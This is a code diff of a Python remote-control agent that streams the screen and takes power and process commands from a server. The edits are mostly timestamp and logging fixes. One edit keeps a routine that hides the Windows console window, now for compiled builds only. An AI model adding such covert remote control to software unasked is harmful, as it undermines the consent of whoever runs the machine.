@@ -4331,14 +4287,12 @@ class ScreenConnectAgent:
                         global _adv_viewers
                         _adv_viewers = max(_adv_viewers, 1)
                         log.info("Forced _adv_viewers=1 via request_action")
-                        
-                        # v16: Ensure the high-performance stream task is running
+
+                        # Ensure the video stream task is running
                         if not _adv_task_running:
                             asyncio.create_task(_adv_task_stream_frames(unified_sio=sio))
-                        
-                        _start_screenshot_fallback(sio)
                     elif action == "stop":
-                        _fb_stop.set()
+                        pass  # stream stops naturally when _adv_viewers drops to 0
                 
                 # ── Power Management ──────────────────────────────────────────
                 elif tab in ("shutdown", "restart", "sleep", "lock_screen", "logoff", "abort_shutdown", "hibernate"):
@@ -4363,9 +4317,9 @@ class ScreenConnectAgent:
                             if sys.platform == "win32":
                                 subprocess.Popen("shutdown /l", shell=True)
                         
-                        sio.emit("action_result", { "device_id": CONFIG["DEVICE_TOKEN"], "action": tab, "success": True, "message": f"Power command {tab} executed.", "ts": datetime.utcnow().isoformat() })
+                        sio.emit("action_result", { "device_id": CONFIG["DEVICE_TOKEN"], "action": tab, "success": True, "message": f"Power command {tab} executed.", "ts": datetime.now(timezone.utc).isoformat() })
                     except Exception as e:
-                        sio.emit("action_result", { "device_id": CONFIG["DEVICE_TOKEN"], "action": tab, "success": False, "message": str(e), "ts": datetime.utcnow().isoformat() })
+                        sio.emit("action_result", { "device_id": CONFIG["DEVICE_TOKEN"], "action": tab, "success": False, "message": str(e), "ts": datetime.now(timezone.utc).isoformat() })
 
                 # ── Process Manager ───────────────────────────────────────────
                 elif tab == "processes":
@@ -4373,7 +4327,7 @@ class ScreenConnectAgent:
                     sio.emit("processes_report", {
                         "device_id": CONFIG["DEVICE_TOKEN"],
                         "processes": procs, "count": len(procs),
-                        "ts": datetime.utcnow().isoformat()
+                        "ts": datetime.now(timezone.utc).isoformat()
                     })
                 elif tab in ("kill_process", "suspend_process", "resume_process"):
                     pid = int(data.get("pid", 0))
@@ -4899,7 +4853,7 @@ class ScreenConnectAgent:
                 sio.emit("config_ack", {
                     "device_id": CONFIG["DEVICE_TOKEN"],
                     "changed":   changed,
-                    "ts":        datetime.utcnow().isoformat(),
+                    "ts":        datetime.now(timezone.utc).isoformat(),
                 })
 
         # ── v14: Memory pressure check before stream ────────────────────────
@@ -4914,7 +4868,7 @@ class ScreenConnectAgent:
                 "ram_avail_mb":  round(vm.available / (1024**2), 1),
                 "pressure":      pressure,
                 "threshold_pct": _MEM_PRESSURE_PCT,
-                "ts":            datetime.utcnow().isoformat(),
+                "ts":            datetime.now(timezone.utc).isoformat(),
             })
             if pressure:
                 log.warning(f"Memory pressure: {vm.percent:.0f}% — stream quality auto-reduced")
@@ -4945,7 +4899,7 @@ class ScreenConnectAgent:
             sio.emit("network_info", {
                 "device_id":  CONFIG["DEVICE_TOKEN"],
                 "interfaces": addrs_map,
-                "ts":         datetime.utcnow().isoformat(),
+                "ts":         datetime.now(timezone.utc).isoformat(),
             })
 
         # ── v14: Guest token validation gate ───────────────────────────────
@@ -4957,7 +4911,7 @@ class ScreenConnectAgent:
                 "device_id":  CONFIG["DEVICE_TOKEN"],
                 "viewer_sid": viewer_sid,
                 "valid":      True,
-                "ts":         datetime.utcnow().isoformat(),
+                "ts":         datetime.now(timezone.utc).isoformat(),
             })
 
         # ── v14: Adaptive quality pong handler ─────────────────────────────
@@ -4999,7 +4953,7 @@ class ScreenConnectAgent:
                         "stream_mon":   CONFIG.get("STREAM_MONITOR"),
                         "adv_authed":   _adv_authed,
                         "adv_viewers":  _adv_viewers,
-                        "ts":           datetime.utcnow().isoformat(),
+                        "ts":           datetime.now(timezone.utc).isoformat(),
                     }
                     sio.emit("diagnostics_result", bundle)
                 except Exception as e:
@@ -5014,6 +4968,18 @@ class ScreenConnectAgent:
         log.info(f"Screen Connect Agent v{CONFIG['AGENT_VERSION']} starting...")
         # ── v14: Load persisted config ──
         _load_config_secure()
+        # ── v16 FIX: Warn if still pointing at localhost but running externally ──
+        _url = CONFIG["SERVER_URL"]
+        _hostname = socket.gethostname()
+        if "localhost" in _url or "127.0.0.1" in _url:
+            log.warning("="*70)
+            log.warning("WARNING: SERVER_URL is set to localhost/127.0.0.1!")
+            log.warning(f"  This agent is running on: {_hostname}")
+            log.warning("  If the server runs on a DIFFERENT machine, agents will")
+            log.warning("  NEVER connect. Set SERVER_URL in agent_config.txt:")
+            log.warning("    SERVER_URL=http://<server-ip>:10000")
+            log.warning("  Place agent_config.txt in the same folder as this script.")
+            log.warning("="*70)
         if CONFIG["DEVICE_TOKEN"] == "UNSET-RUN-VIA-SERVER":
             log.warning("="*60)
             log.warning("DEVICE_TOKEN is not set! Run with a real token:")
@@ -5202,11 +5168,12 @@ if __name__ == "__main__":
     _sig.signal(_sig.SIGTERM, _graceful_shutdown)
     _sig.signal(_sig.SIGINT,  _graceful_shutdown)
 
-    # Hide console window on Windows
-    try:
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
-    except Exception:
-        pass
+    # Hide console window on Windows — only for compiled .exe, NOT .py dev mode
+    if getattr(sys, "frozen", False):
+        try:
+            ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        except Exception:
+            pass
 
     log.info(
         f"--- MasterAgent v{CONFIG.get('AGENT_VERSION','?')} starting "
